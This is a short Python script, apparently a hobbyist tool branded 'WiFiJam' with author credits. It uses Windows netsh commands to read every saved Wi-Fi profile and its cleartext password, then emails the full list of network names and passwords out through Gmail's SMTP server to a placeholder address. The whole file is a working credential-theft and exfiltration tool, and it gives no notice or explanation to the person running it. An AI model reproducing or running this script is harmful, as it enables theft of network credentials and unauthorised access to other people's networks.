import subprocess
import re
import smtplib
from email.message import EmailMessage

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
profile_names = re.findall("All User Profiles     : (.*)\r", command_output)
wifi_list = list()
print(r""" 
//////////////////////////////////////////////////
//__        ___ _____ _       _                 //
//\ \      / (_)  ___(_)     | | __ _ _ __ ___  //
// \ \ /\ / /| | |_  | |  _  | |/ _` | '_ ` _ \ //
//  \ V  V / | |  _| | | | |_| | (_| | | | | | |//
//   \_/\_/  |_|_|   |_|  \___/ \__,_|_| |_| |_|//
//////////////////////////////////////////////////
""")
print("\n****************************************************************")
print("\n* Copyright of *Vivek W*, 2024")
print("\n* 🔥GitHub:    github.com/AryanVBW")
print("\n* 🌐Site:     portfolio.aryanvbw.live")
print("\n* 💖Instagram: Aryan_Technolog1es")
print("\n* 📧Email:    admin@aryanvbw.live")
print("\n****************************************************************")

if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            if password is None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]
            wifi_list.append(wifi_profile)

email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

email = EmailMessage()
email["from"] = "name_of_sender"
email["to"] = "email_address"
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.login("login_name", "password")
    smtp.send_message(email)
